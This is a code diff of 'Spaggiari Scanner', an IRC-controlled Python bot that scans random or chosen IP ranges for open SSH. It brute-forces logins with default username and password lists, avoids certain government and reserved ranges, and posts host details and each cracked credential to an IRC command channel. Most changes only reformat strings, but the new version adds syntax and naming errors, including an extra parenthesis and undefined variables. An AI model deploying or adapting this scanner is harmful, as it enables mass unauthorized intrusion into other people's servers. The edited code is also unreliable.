@@ -62,7 +62,7 @@ import time
 import urllib.request
 from collections import OrderedDict
 
-# IRC Config
+# Connection
 server     = 'irc.server.com'
 port       = 6667
 use_ipv6   = False
@@ -70,9 +70,9 @@ use_ssl    = False
 password   = None
 channel    = '#dev'
 key        = None
-admin_host = 'admin.host'
+admin_host = 'admin@admin.host'
 
-# Throttle Settings
+# Throttle
 max_threads     = 100
 throttle        = 20
 timeout_breaker = 5
@@ -85,13 +85,12 @@ combos = OrderedDict([
     ('admin', ('1234','12345','123456','4321','9999','abc123','admin','changeme','admin123','password'))
 ])
 
-# Important Ranges (DO NOT EDIT)
+# Important Ranges
 spooky   = ('11','21','22','24','25','26','29','49','50','55','62','64','128','129','130','131','132','134','136','137','138','139','140','143','144','146','147','148','150','152','153','155','156','157','158','159','161','162','163','164','167','168','169','194','195','199','203','204','205','207','208','209','212','213','216','217','6','7')
 reserved = ('0','10','100.64','100.65','100.66','100.67','100.68','100.69','100.70','100.71','100.72','100.73','100.74','100.75','100.76','100.77','100.78','100.79','100.80','100.81','100.82','100.83','100.84','100.85','100.86','100.87','100.88','100.89','100.90','100.91','100.92','100.93','100.94','100.95','100.96','100.97','100.98','100.99','100.100','100.101','100.102','100.103','100.104','100.105','100.106','100.107','100.108','100.109','100.110','100.111','100.112','100.113','100.114','100.115','100.116','100.117','100.118','100.119','100.120','100.121','100.122','100.123','100.124','100.125','100.126','100.127','127','169.254','172.16','172.17','172.18','172.19','172.20','172.21','172.22','172.23','172.24','172.25','172.26','172.27','172.28','172.29','172.30','172.31','172.32','192.0.0','192.0.2','192.88.99','192.168','198.18','198.19','198.51.100','203.0.113','224','225','226','227','228','229','230','231','232','233','234','235','236','237','238','239','240','241','242','243','244','245','246','247','248','249','250','251','252','253','254','255')
 
 # Formatting Control Characters / Color Codes
 bold        = '\x02'
-colour      = '\x03'
 italic      = '\x1D'
 underline   = '\x1F'
 reverse     = '\x16'
@@ -115,16 +114,16 @@ light_grey  = '15'
 
 # Debug Functions
 def debug(msg):
-    print('%s | [~] - %s' % (get_time(), msg))
+    print('{0} | [~] - {1}'.format(get_time(), msg))
 
 def error(msg, reason=None):
     if reason:
-        print('%s | [!] - %s (%s)' % (get_time(), msg, str(reason)))
+        print('{0} | [!] - {1} ({2})'.format(get_time(), msg, str(reason)))
     else:
-    	print('%s | [!] - %s' % (get_time(), msg))
+        print('{0} | [!] - {1}'.format(get_time(), msg))
 
 def error_exit(msg):
-    raise SystemExit('%s | [!] - %s' % (get_time(), msg))
+    raise SystemExit('{0} | [!] - {1}'.format(get_time(), msg))
 
 def get_time():
     return time.strftime('%I:%M:%S')
@@ -149,8 +148,10 @@ def check_port(ip, port):
     except socket.error:
         return False
     else:
-        if not code  : return True
-        else         : return False
+        if not code:
+            return True
+        else:
+            return False
     finally:
         sock.close()
 
@@ -166,9 +167,9 @@ def check_range(targets):
 
 def color(msg, foreground, background=None):
     if background:
-    	return '%s%s,%s%s%s' % (colour, foreground, background, msg, reset)
+        return '\x03{0},{1}{2}{3}'.format(foreground, background, msg, reset)
     else:
-    	return '%s%s%s%s' % (colour, foreground, msg, reset)
+        return '\x03{0}{1}{2}'.format(foreground, msg, reset)
 
 def get_arch():
     return ' '.join(platform.architecture())
@@ -217,7 +218,7 @@ def ip_range(start_ip, end_ip):
     return ip_range
 
 def random_ip():
-    return '%s.%s.%s.%s' % (random_int(1,223), random_int(0,255), random_int(0,255), random_int(0,255))
+    return '{0}.{1}.{2}.{3}'.format(random_int(1,223), random_int(0,255), random_int(0,255), random_int(0,255))
 
 def random_int(min, max):
     return random.randint(min, max)
@@ -258,7 +259,7 @@ class range_scan(threading.Thread):
         while threading.activeCount() >= 2:
             time.sleep(1)
         SpaggiariBot.scanning = False
-        SpaggiariBot.sendmsg(chan, '[%s] - Scan has completed.' % (color('#', blue)))
+        SpaggiariBot.sendmsg(chan, '[{0}] - Scan has completed.'.format(color('#', blue)))
 
 class ssh_bruteforce(threading.Thread):
     def __init__(self, ip):
@@ -296,7 +297,7 @@ def ssh_connect(hostname, username, password):
     except Exception as ex:
         return 0
     else:
-        SpaggiariBot.sendmsg(channel, '[%s] - Successful connection to %s using %s:%s' % (color('+', green), hostname, username, password))
+        SpaggiariBot.sendmsg(channel, '[{0}] - Successful connection to {1} using {2}:{3}'.format(color('+', green), hostname, username, password))
         return 2
     finally:
         ssh.close()
@@ -305,7 +306,7 @@ def ssh_connect(hostname, username, password):
 
 # IRC Bot Object
 class IRC(object):
-    def __init__(self, server, port, use_ipv6, use_ssl, password, channel, key):
+    def __init__(self):
         self.server    = server
         self.port      = port
         self.use_ipv6  = use_ipv6
@@ -313,28 +314,29 @@ class IRC(object):
         self.password  = password
         self.channel   = channel
         self.key       = key
-        self.nickname  = 'spag-xxxxx'
-        self.id        = 'xxxxx'
-        self.sock      = None
+        self.nickname  = None
+        self.id        = None
         self.scanning  = False
         self.stop_scan = False
+        self.sock      = None
 
     def start(self):
         self.nickname = 'spag-' + random_str(5)
-        if os.getuid() == 0 or os.geteuid() == 0: self.nickname = 'r' + self.nickname
+        if os.getuid() == 0 or os.geteuid() == 0:
+            self.nickname = 'r' + self.nickname
         self.id = self.nickname[-5:]
         self.connect()
 
     def action(self, chan, msg):
-        self.sendmsg(chan, '\x01ACTION %s\x01' % msg)
+        self.sendmsg(chan, '\x01ACTION {0}\x01'.format(msg))
 
     def connect(self):
         try:
             self.create_socket()
             self.sock.connect((self.server, self.port))
             if self.password:
-            	self.raw('PASS ' + self.password)
-            self.raw('USER %s 0 * :%s' % (random_str(5), random_str(5)))
+                self.raw('PASS ' + self.password)
+            self.raw('USER {0} 0 * :{1}'.format(self.username, self.realname))
             self.nick(self.nickname)
         except Exception as ex:
             error('Failed to connect to IRC server.', ex)
@@ -344,40 +346,29 @@ class IRC(object):
 
     def create_socket(self):
         if self.use_ipv6:
-            family = socket.AF_INET6
+            self.sock = socket.socket(socket.AF_INET6, socket.SOCK_STREAM)
         else:
-            family = socket.AF_INET
-        self.sock = socket.socket(family, socket.SOCK_STREAM)
+            self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         if self.use_ssl:
-            self.sock = ssl.wrap_socket(self.sock)
+            self.sock = ssl.wrap_socket(self.sock))
 
-    def disconnect(self):
-        if self.sock:
-            try:
-            	self.sock.shutdown(socket.SHUT_RDWR)
-            except:
-                pass
-            self.sock.close()
-            self.sock = None
+    def error(self, chan, msg, reason=None):
+        if reason:
+            self.sendmsg(chan, '[{0}] {1} {2}'.format(color('ERROR', red), msg, color('({0})'.format(str(reason)), grey)))
+        else:
+            self.sendmsg(chan, '[{0}] {1}'.format(color('ERROR', red), msg))
+
+    def event_connect(self):
+        self.join(self.channel, self.key)
+        
+    def event_disconnect(self):
+        self.sock.close()
         self.stop_scan = True
         while threading.activeCount() >= 3:
             time.sleep(1)
         self.scanning  = False
         self.stop_scan = False
-
-    def error(self, chan, msg, reason=None):
-        if reason:
-            self.sendmsg(chan, '[%s] - %s %s' % (color('-', red), msg, color('(' + str(reason) + ')', grey)))
-        else:
-            self.sendmsg(chan, '[%s] - %s' % (color('-', red), msg))
-
-    def event_connect(self):
-        self.mode(self.nickname, '+B')
-        self.join(self.channel, self.key)
-        
-    def event_disconnect(self):
-        self.disconnect()
-        time.sleep(5)
+        time.sleep(10)
         self.connect()
 
     def event_kick(self, nick, chan, kicked, reason):
@@ -391,7 +382,7 @@ class IRC(object):
             if len(args) == 2:
                 if args[1] == 'all' or args[1] == self.id:
                     if cmd == 'info':
-                        self.sendmsg(chan, '%s@%s (%s) | %s %s | %s' % (get_username(), get_hostname(), get_ip(), get_dist(), get_arch(), get_kernel()))
+                        self.sendmsg(chan, '{0}@{1} ({2}) | {3} {4} | {5}'.format(get_username(), get_hostname(), get_ip(), get_dist(), get_arch(), get_kernel()))
                     elif cmd == 'kill':
                         self.stop_scan = True
                         self.scanning  = False
@@ -399,7 +390,7 @@ class IRC(object):
                         sys.exit()
                     elif cmd == 'random':
                         if not self.scanning:
-                            self.sendmsg(chan, '[%s] - Scanning random IP addresses...' % color('#', blue))
+                            self.sendmsg(chan, '[{0}] - Scanning random IP addresses...'.format(color('#', blue)))
                             random_scan().start()
                         else:
                             self.error(chan, 'A scan is already running.')
@@ -421,19 +412,19 @@ class IRC(object):
                     if not self.scanning:
                         if args[2] in ('b','c'):
                             if args[2] == 'b':
-                                if args[3] == 'random' : range_prefix = '%d.%d' % (random_int(0,255), random_int(0,255))
+                                if args[3] == 'random' : range_prefix = '{0}.{1}'.format(random_int(0,255), random_int(0,255))
                                 else                   : range_prefix = args[3]
                                 start = range_prefix + '.0.0'
                                 end   = range_prefix + '.255.255'
                             elif args[2] == 'c':
-                                if args[3] == 'random' : range_prefix = '%d.%d.%d' % (random_int(0,255), random_int(0,255), random_int(0,255))
+                                if args[3] == 'random' : range_prefix = '{0}.{1}.{2}'.format(random_int(0,255), random_int(0,255), random_int(0,255))
                                 else                   : range_prefix = args[3]
                                 start = range_prefix + '.0'
                                 end   = range_prefix + '.255'
                             if check_ip(start) and check_ip(end):
                                 targets = ip_range(start, end)
                                 if not check_range(targets):
-                                    self.sendmsg(chan, '[%s] - Scanning %s IP addresses in range...' % (color('#', blue), '{:,}'.format(len(targets))))
+                                    self.sendmsg(chan, '[{0}] - Scanning {1} IP addresses in range...'.format(color('#', blue), '{:,}'.format(len(targets))))
                                     self.scanning = True
                                     scan(targets).start()
                                 else:
@@ -458,23 +449,22 @@ class IRC(object):
             self.event_connect() 
         elif args[1] == '433':
             self.event_nick_in_use()
-        elif args[1] in ('KICK', 'PRIVMSG'):
-            name = args[0].split('!')[0][1:]
-            if name != self.nickname:
-                if args[1] == 'KICK':
-                    chan   = args[2]
-                    kicked = args[3]
-                    self.event_kick(name, chan, kicked)
-                elif args[1] == 'PRIVMSG':
-                    chan = args[2]
-                    msg  = data.split(args[1] + ' ' + chan + ' :')[1]
-                    host = args[0].split('!')[1].split('@')[1]
-                    if chan == self.channel:
-                        self.event_message(name, host, chan, msg)
+        if args[1] == 'KICK':
+            nick   = args[0].split('!')[0][1:]
+            chan   = args[2]
+            kicked = args[3]
+            self.event_kick(name, chan, kicked)
+        elif args[1] == 'PRIVMSG':
+            nick  = args[0].split('!')[0][1:]
+            ident = args[0].split('!')[1]
+            chan  = args[2]
+            msg   = data.split('{0} PRIVMSG {1} :'.format(args[0], chan))[1]
+            if chan != self.nickname:
+                self.event_message(name, ident, chan, msg)
 
     def join(self, chan, key=None):
         if key:
-            self.raw('JOIN %s %s' % (chan, key))
+            self.raw('JOIN {0} {1}'.format(chan, key))
         else:
             self.raw('JOIN ' + chan)
 
@@ -498,9 +488,6 @@ class IRC(object):
                 break
         self.event_disconnect()
 
-    def mode(self, target, mode):
-        self.raw('MODE %s %s' % (target, mode))
-
     def nick(self, nick):
         self.raw('NICK ' + nick)
 
@@ -514,15 +501,15 @@ class IRC(object):
         self.sock.send(bytes(msg + '\r\n', 'utf-8'))
 
     def sendmsg(self, target, msg):
-        self.raw('PRIVMSG %s :%s' % (target, msg))
+        self.raw('PRIVMSG {0} :{1}'.format(target, msg))
 
 # Main
 print(''.rjust(56, '#'))
-print('#%s#' % ''.center(54))
-print('#%s#' % 'Spaggiari Scanner'.center(54))
-print('#%s#' % 'Developed by acidvegas in Python 3'.center(54))
-print('#%s#' % 'https://github.com/acidvegas/spaggiari'.center(54))
-print('#%s#' % ''.center(54))
+print('#{0}#'.format(''.center(54)))
+print('#{0}#'.format('Spaggiari Scanner'.center(54)))
+print('#{0}#'.format('Developed by acidvegas in Python 3'.center(54)))
+print('#{0}#'.format('https://github.com/acidvegas/spaggiari'.center(54)))
+print('#{0}#'.format(''.center(54)))
 print(''.rjust(56, '#'))
 if not sys.version_info.major == 3:
     error_exit('Spaggiari Scanner requires Python version 3 to run!')
